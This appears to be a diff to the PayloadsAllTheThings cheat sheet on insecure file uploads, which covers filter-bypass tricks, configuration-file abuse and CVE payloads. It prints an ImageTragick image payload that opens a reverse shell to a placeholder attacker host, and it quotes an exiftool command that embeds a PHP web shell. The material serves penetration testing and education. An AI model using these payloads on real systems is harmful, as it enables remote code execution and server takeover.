@@ -11,7 +11,7 @@
     * [Filename vulnerabilities](#filename-vulnerabilities)
     * [Picture compression](#picture-compression-)
     * [Configuration Files](#configuration-files)
-    * [CVE - Image Tragik](#cve---image-tragik)
+    * [CVE - ImageMagick](#cve---imagemagick)
     * [CVE - FFMpeg](#cve---ffmpeg)
     * [ZIP Archive](#zip-archive)
     * [Jetty RCE](#jetty-rce)
@@ -57,9 +57,10 @@
     shell.aspx;1.jpg # (IIS < 7.0)
     shell.soap
     ```
-* JSP : `.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action`s
+* JSP : `.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .actions`
 * Perl: `.pl, .pm, .cgi, .lib`
 * Coldfusion: `.cfm, .cfml, .cfc, .dbm`
+* Node.js: `.js, .json, .node`
 
 ### Upload tricks
 
@@ -86,7 +87,7 @@
     * `Content-Type : image/gif`
     * `Content-Type : image/png`
     * `Content-Type : image/jpeg`
-    * Content-Type wordlist: [SecLists/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)
+    * Content-Type wordlist: [SecLists/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
     * Set the Content-Type twice: once for unallowed type and once for allowed.
 - [Magic Bytes](https://en.wikipedia.org/wiki/List_of_file_signatures)
     * Sometimes applications identify file types based on their first signature bytes. Adding/replacing them in a file might trick the application.
@@ -136,12 +137,14 @@ exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __h
 If you are trying to upload files to a :
 - PHP server, take a look at the [.htaccess](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess) trick to execute code.
 - ASP server, take a look at the [web.config](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config) trick to execute code.
+- uWSGI server, take a look at the [uwsgi.ini](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20uwsgi.ini/uwsgi.ini) trick to execute code.
 
 Configuration files examples
 - [.htaccess](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess)
 - [web.config](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config)
 - [httpd.conf](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Busybox%20httpd.conf)
 - [\_\_init\_\_.py](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Python%20__init__.py)
+- [uwsgi.ini](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20uwsgi.ini/uwsgi.ini)
 
 Alternatively you may be able to upload a JSON file with a custom scripts, try to overwrite a dependency manager configuration file.
 - package.json
@@ -159,18 +162,19 @@ Alternatively you may be able to upload a JSON file with a custom scripts, try t
     }
     ```
 
-### CVE - Image Tragik
+### CVE - ImageMagick
 
-Upload this content with an image extension to exploit the vulnerability (ImageMagick , 7.0.1-1)
+If the backend is using ImageMagick to resize/convert user images, you can try to exploit well-known vulnerabilities such as ImageTragik.
 
-```powershell
-push graphic-context
-viewbox 0 0 640 480
-fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
-pop graphic-context
-```
+* ImageTragik example: Upload this content with an image extension to exploit the vulnerability (ImageMagick , 7.0.1-1)
+    ```powershell
+    push graphic-context
+    viewbox 0 0 640 480
+    fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
+    pop graphic-context
+    ```
 
-More payload in the folder `Picture Image Magik`
+More payloads in the folder `Picture ImageMagick`
 
 ### CVE - FFMpeg
 
@@ -214,3 +218,5 @@ Upload the XML file to `$JETTY_BASE/webapps/`
 * [A tip for getting RCE in Jetty apps with just one XML file! - Aug 4, 2022 - PT SWARM / @ptswarm](https://twitter.com/ptswarm/status/1555184661751648256/)
 * [Jetty Features for Hacking Web Apps - September 15, 2022 - Mikhail Klyuchnikov](https://swarm.ptsecurity.com/jetty-features-for-hacking-web-apps/)
 * [Inyección de código en imágenes subidas y tratadas con PHP-GD  - Spanish Resource - hackplayers](https://www.hackplayers.com/2020/03/inyeccion-de-codigo-en-imagenes-php-gd.html)
+* [A New Vector For “Dirty” Arbitrary File Write to RCE - Doyensec - Maxence Schmitt and Lorenzo Stella](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
+* [PHP Internals Book - THE .PHPT FILE STRUCTURE](https://www.phpinternalsbook.com/tests/phpt_file_structure.html)
